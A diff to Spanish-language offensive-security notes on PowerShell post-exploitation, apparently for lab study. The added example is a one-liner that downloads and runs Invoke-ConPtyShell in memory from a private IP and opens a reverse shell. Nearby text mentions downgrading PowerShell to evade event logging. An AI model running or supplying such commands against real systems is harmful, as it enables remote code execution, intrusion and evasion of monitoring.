@@ -69,6 +69,8 @@ Cuando no tenemos acceso a alguna de las herramientas de explotación
 - Descargar un archivo y cargarlo en memoria (`-nop`: no profile)
 	```powershell
 	powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
+	#Ejemplo:
+	powershell -nop -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.45.244:8000/Invoke-ConPtyShell.ps1'); Invoke-ConptyShell 192.168.45.244 5555"
 	```
 ## Degradar PowerShell
 Puede ser útil para ser sigilosos, ya que a partir de la versión 3.0 de powershell se introdujo el event logging
@@ -113,7 +115,7 @@ Puede ser útil para ser sigilosos, ya que a partir de la versión 3.0 de powers
 	qwinsta
 	```
 
-## ## WMI
+##  WMI
 - Mostrar parches y hotfixes aplicados
 	```powershell
 	wmic qfe get Caption,Description,HotFixID,InstalledOn
